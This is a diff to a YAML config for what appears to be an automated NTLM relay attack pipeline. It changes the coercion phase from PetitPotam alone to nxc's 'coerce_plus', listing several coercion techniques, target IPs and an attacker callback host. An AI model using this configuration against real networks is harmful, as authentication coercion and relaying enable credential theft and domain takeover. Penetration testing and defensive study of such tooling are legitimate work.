@@ -31,14 +31,17 @@ ntlmrelayx:
 # Coercion phase
 coerce:
   enabled: true
-  # nxc coerce method (e.g., petitpotam, printerbug, shadowcoerce)
+  # nxc coerce_plus methods: PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce, MSEven
+  # Use 'coerce_plus' or 'all' to let nxc try every method.
   methods:
-    - "petitpotam"
+    - "coerce_plus"
   targets:
     - "192.168.1.10"
     - "192.168.1.11"
   # Listener callback exposed to coerced targets (our host IP)
   callback_host: "192.168.1.5"
+  # Run all coerce methods even if one already succeeded
+  always: false
   delay_between: 5.0
   workers: 4
 
